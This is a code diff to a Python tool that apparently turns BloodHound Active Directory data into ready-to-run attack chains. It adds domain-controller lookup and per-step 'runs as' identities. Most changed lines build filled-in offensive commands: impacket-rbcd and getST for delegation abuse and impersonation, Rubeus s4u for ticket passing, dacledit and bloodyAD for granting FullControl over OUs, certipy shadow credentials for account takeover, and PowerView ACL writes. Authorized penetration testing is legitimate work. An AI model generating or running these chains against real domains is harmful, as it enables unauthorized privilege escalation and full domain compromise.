@@ -15,7 +15,7 @@ from collections import defaultdict, deque
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer, BaseHTTPRequestHandler
 from pathlib import Path
 
-__version__ = "0.3.4"
+__version__ = "0.4.0"
 
 ROOT = Path(__file__).resolve().parent
 WEB = ROOT / "web"
@@ -829,6 +829,19 @@ def search_nodes(domain_id, q):
     ]
 
 
+def domain_dc(con, domain_id):
+    """The domain controller, straight from the graph — there is no reason to make
+    the operator type a hostname the import already knows. Its IP is the one thing
+    BloodHound never collects, so that stays a field."""
+    for row in con.execute(
+        "SELECT sid,label,props FROM nodes WHERE domain_id=? AND type='Computer'", (domain_id,)
+    ):
+        props = props_of(row, "props")
+        if is_dc_node(row["label"], props):
+            return {"sid": row["sid"], "label": row["label"], "fqdn": (row["label"] or "").lower()}
+    return None
+
+
 def domain_stats(domain_id):
     con = db()
     by_type = con.execute(
@@ -865,8 +878,10 @@ def domain_stats(domain_id):
         """,
         (domain_id,),
     ).fetchall()
+    dc = domain_dc(con, domain_id)
     con.close()
     return {
+        "dc": dc,
         "nodes": row["nodes"] or 0,
         "edges": edge["edges"] or 0,
         "abusable": edge["abusable"] or 0,
@@ -983,6 +998,10 @@ def abuse_for(right, src, dst, domain, src_dn="", dst_dn=""):
         {
             "os": row["os"],
             "tool": row["tool"],
+            # Which identity this command authenticates as. Credentials are held
+            # per principal, not globally: one chain can legitimately run as two
+            # different accounts (the delegating account and the RBCD bridge).
+            "as": src_short,
             "cmd": row["cmd"].format(
                 src=src_short, dst=dst_short, domain=domain,
                 dstfqdn=dst_fqdn, DOMAIN=(domain or "").upper(),
@@ -1238,11 +1257,11 @@ def delegation_abuse(src_sid, src_label, src_props, dst_label, dst_type, dst_pro
     out = []
     step = [0]
 
-    def add(tool, cmd, os_="linux", numbered=True):
+    def add(tool, cmd, os_="linux", numbered=True, runs_as=None):
         if numbered:
             step[0] += 1
             tool = "{} · {}".format(step[0], tool)
-        out.append({"os": os_, "tool": tool, "cmd": cmd})
+        out.append({"os": os_, "tool": tool, "cmd": cmd, "as": runs_as or sam})
 
     if p.get("trustedtoauth"):
         # Protocol transition on: S4U2Self hands back a forwardable ticket, so one
@@ -1277,7 +1296,8 @@ def delegation_abuse(src_sid, src_label, src_props, dst_label, dst_type, dst_pro
     add("RBCD: let {} act on behalf of others toward {}".format(helper_name, sam),
         "impacket-rbcd {} -k -delegate-from '{}' -delegate-to '{}' -action write -dc-ip <dc-ip> -use-ldaps".format(cred, helper_name, sam))
     add("evidence ticket via RBCD — this one IS forwardable",
-        "impacket-getST {} -spn '{}' -impersonate '{}' -dc-ip <dc-ip>".format(helper_cred, bridge_spn, who))
+        "impacket-getST {} -spn '{}' -impersonate '{}' -dc-ip <dc-ip>".format(helper_cred, bridge_spn, who),
+        runs_as=helper_name)
     add("S4U2Proxy with -additional-ticket (skips the non-forwardable S4U2Self)",
         "impacket-getST {} -spn '{}' -impersonate '{}' -additional-ticket '{}' -dc-ip <dc-ip>".format(cred, spn, who, evidence))
     add("load the ticket", "export KRB5CCNAME=\"$PWD/{}\" && klist -e".format(final))
@@ -1305,13 +1325,13 @@ def rbcd_abuse(src_label, src_props, dst_label, dst_type, dst_props, domain, ctx
     who, why = impersonation_target(ctx, dst_label, dst_type, dst_props)
     final = ccache_of(who, spn, domain)
     out = [
-        {"os": "linux", "tool": "1 · getST (S4U2Self + S4U2Proxy)",
+        {"os": "linux", "as": sam, "tool": "1 · getST (S4U2Self + S4U2Proxy)",
          "cmd": "impacket-getST {} -spn '{}' -impersonate '{}' -dc-ip <dc-ip>".format(cred, spn, who)},
-        {"os": "linux", "tool": "2 · load the ticket", "cmd": "export KRB5CCNAME=\"$PWD/{}\" && klist".format(final)},
+        {"os": "linux", "as": sam, "tool": "2 · load the ticket", "cmd": "export KRB5CCNAME=\"$PWD/{}\" && klist".format(final)},
     ]
     for n, (label, cmd) in enumerate(delegation_payoff(spn, dst_label, dst_props, final, domain), start=3):
-        out.append({"os": "linux", "tool": "{} · {}".format(n, label), "cmd": cmd})
-    out.append({"os": "windows", "tool": "Rubeus s4u",
+        out.append({"os": "linux", "as": sam, "tool": "{} · {}".format(n, label), "cmd": cmd})
+    out.append({"os": "windows", "as": sam, "tool": "Rubeus s4u",
                 "cmd": "Rubeus.exe s4u /user:{} /rc4:<nt-hash> /impersonateuser:{} /msdsspn:{} /ptt".format(sam, who, spn)})
     return out, spn, who, why
 
@@ -1437,11 +1457,11 @@ def gain_commands(chain, actor, actor_dn, domain, ou_dn=None):
     return steps
 
 
-def prelude_cmds(prelude):
+def prelude_cmds(prelude, actor=""):
     """The shared setup as plain command entries. Numbering is left to the caller:
     the same prelude serves every target reached through the same trail, so it is
     rendered once and the per-target steps continue from where it ends."""
-    return [{"os": "linux", "tool": label, "cmd": cmd} for label, cmd in prelude]
+    return [{"os": "linux", "as": actor, "tool": label, "cmd": cmd} for label, cmd in prelude]
 
 
 def prelude_key(chain, ou_dn=""):
@@ -1524,7 +1544,7 @@ def group_delegated(con, domain_id, sid, node_label, domain_name, exclude):
                 result.append({
                     "target": e["target_sid"], "targetLabel": e["target_label"], "targetType": e["ttype"],
                     "right": e["right_name"], "via": chain,
-                    "prelude": prelude_cmds(gain_commands(chain, actor, actor_dn, domain_name)),
+                    "prelude": prelude_cmds(gain_commands(chain, actor, actor_dn, domain_name), actor),
                     "preludeKey": prelude_key(chain),
                     "abuse": edge_abuse(e, actor, domain_name, src_dn=actor_dn),
                     **_edge_esc(e),
@@ -1544,7 +1564,7 @@ def group_delegated(con, domain_id, sid, node_label, domain_name, exclude):
                     "target": child_sid, "targetLabel": child_label, "targetType": child_type,
                     "right": "GenericAll", "via": chain,
                     "note": "Objects with adminCount=1 do NOT inherit ACEs from their parent OU.",
-                    "prelude": prelude_cmds(prelude),
+                    "prelude": prelude_cmds(prelude, actor),
                     "preludeKey": prelude_key(chain, ou_dn),
                     "abuse": abuse_for("GenericAll", actor, name_of.get(child_sid) or child_label, domain_name,
                                        src_dn=actor_dn, dst_dn=dn_of.get(child_sid, "")),
@@ -1655,14 +1675,14 @@ def ou_takeover(actor, ou_dn, domain, child_hint="<object-in-the-ou>"):
     meaningless."""
     dom = domain or ""
     return [
-        {"os": "linux", "tool": "extend FullControl down the OU (-inheritance)",
+        {"os": "linux", "as": actor, "tool": "extend FullControl down the OU (-inheritance)",
          "cmd": "impacket-dacledit {}/'{}':'<pass>' -action write -rights FullControl -inheritance "
                 "-principal '{}' -target-dn '{}' -dc-ip <dc-ip> -use-ldaps".format(dom, actor, actor, ou_dn)},
-        {"os": "linux", "tool": "same step, bloodyAD",
+        {"os": "linux", "as": actor, "tool": "same step, bloodyAD",
          "cmd": "bloodyAD --host <dc> -d {} -u '{}' -p '<pass>' add genericAll '{}' '{}'".format(dom, actor, ou_dn, actor)},
-        {"os": "linux", "tool": "then take any object it holds",
+        {"os": "linux", "as": actor, "tool": "then take any object it holds",
          "cmd": "certipy shadow auto -u '{}@{}' -p '<pass>' -account '{}' -dc-ip <dc-ip>   # adminCount=1 objects do NOT inherit".format(actor, dom, child_hint)},
-        {"os": "windows", "tool": "PowerView",
+        {"os": "windows", "as": actor, "tool": "PowerView",
          "cmd": "Add-DomainObjectAcl -TargetIdentity '{}' -PrincipalIdentity '{}' -Rights All".format(ou_dn, actor)},
     ]
 
